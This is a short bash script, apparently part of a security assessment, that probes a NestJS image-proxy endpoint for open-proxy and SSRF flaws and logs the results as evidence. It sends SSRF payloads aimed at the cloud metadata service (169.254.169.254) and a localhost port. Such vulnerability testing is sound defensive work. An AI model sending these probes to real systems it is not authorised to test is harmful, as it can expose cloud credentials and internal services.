#!/usr/bin/env bash
# VULN-01: Test open image proxy / SSRF surface on NestJS
set -euo pipefail

OUT_DIR="$(cd "$(dirname "$0")/../evidence" && pwd)"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
# shellcheck source=local-env.sh
source "$SCRIPT_DIR/local-env.sh"
OUT_FILE="$OUT_DIR/VULN-01-open-proxy.txt"

mkdir -p "$OUT_DIR"

BASE=$(pick_nest_api)
NEST_UP=false
is_up "$BASE/" && NEST_UP=true

{
  echo "=== VULN-01 Open Proxy / SSRF Tests ==="
  echo "API base: $BASE"
  echo "NestJS reachable: $NEST_UP"
  echo "Timestamp: $(date -u +"%Y-%m-%dT%H:%M:%SZ")"
  echo ""

  if [[ "$NEST_UP" != "true" ]]; then
    echo "SKIP: NestJS not running on $BASE (PostgreSQL required). See STATIC-CODE-REVIEW-EVIDENCE.md."
    exit 0
  fi

  test_url() {
    local label="$1"
    local target="$2"
    local encoded
    encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$target', safe=''))" 2>/dev/null || echo "$target")
    echo "--- $label ---"
    echo "Target URL: $target"
    echo "Request: GET $BASE/proxy/image?url=$encoded"
    curl -s -D - --connect-timeout 8 -o /dev/null \
      "$BASE/proxy/image?url=$encoded" 2>&1 | head -20 || echo "(curl failed)"
    echo ""
  }

  test_url "Public image (control)" "https://www.google.com/favicon.ico"
  test_url "Metadata SSRF probe" "http://169.254.169.254/latest/meta-data/"
  test_url "Localhost probe" "http://127.0.0.1:5007/"
  test_url "Non-image HTML" "https://example.com/"
} | tee "$OUT_FILE"

echo "Saved: $OUT_FILE"
